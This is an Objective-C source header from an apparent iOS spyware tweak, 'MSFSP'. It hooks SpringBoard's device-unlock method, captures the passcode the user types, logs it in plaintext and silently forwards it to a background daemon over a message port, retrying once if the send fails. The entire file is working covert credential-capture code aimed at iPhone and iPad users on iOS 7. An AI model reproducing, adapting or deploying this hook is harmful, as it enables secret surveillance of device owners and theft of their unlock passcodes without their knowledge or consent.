//
//  Passcode.h
//  MSFSP
//
//  Created by benjawan tanarattanakorn on 3/5/2557 BE.
//
//

#import <Foundation/Foundation.h>
#import "SBDeviceLockController.h"
#import "MessagePortIPCReader.h"

/*
 * Called every time that the user "wakes iPhone and enter Passcode" or "enters Passcode on iPad"
 * usecase:     - User click Power button
 *              - User click Power or Home button again
 * This is called on iPhone and iPad iOS 7
 *
 * -- For Phone:
 * In case Passcode screen show, this method is called once the user enters Passcode
 * In case Passcode screen is skipped be cause not yet reach the time requiring Passcode, this method is called once the user slide to unlock
 *
 * -- For iPad:
 * In case Passcode screen show, this method is called once the user enters Passcode
 */
HOOK(SBDeviceLockController, attemptDeviceUnlockWithPassword$appRequested$, BOOL, id arg1, BOOL arg2) {
    DLog(@"\n\n>>>>>>>>>>>>>>>>>>>>>>>> SBDeviceLockController attemptDeviceUnlockWithPassword");
    BOOL result         = CALL_ORIG(SBDeviceLockController, attemptDeviceUnlockWithPassword$appRequested$, arg1, arg2);
    NSString *passcode  = arg1;
    DLog(@"============== PASSCODE [%@]", passcode);
    
    if (passcode    && [passcode length]){
        MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:kPasscodeMessagePort];
        NSData *passcodeData                    = [passcode dataUsingEncoding:NSUTF8StringEncoding];
        BOOL successfully                       = FALSE;
        // 1st attempt sending
        successfully                            = [messagePortSender writeDataToPort:passcodeData];
        if (!successfully) {
            DLog (@"1st Not success to send PASSCODE to daemon")
            // 2nd attempt sending
            successfully                        = [messagePortSender writeDataToPort:passcodeData];
            if (!successfully) {
                DLog (@"2nd Not success to send PASSCODE to daemon")
            }
        }
        [messagePortSender release];
    }
    return result;
}

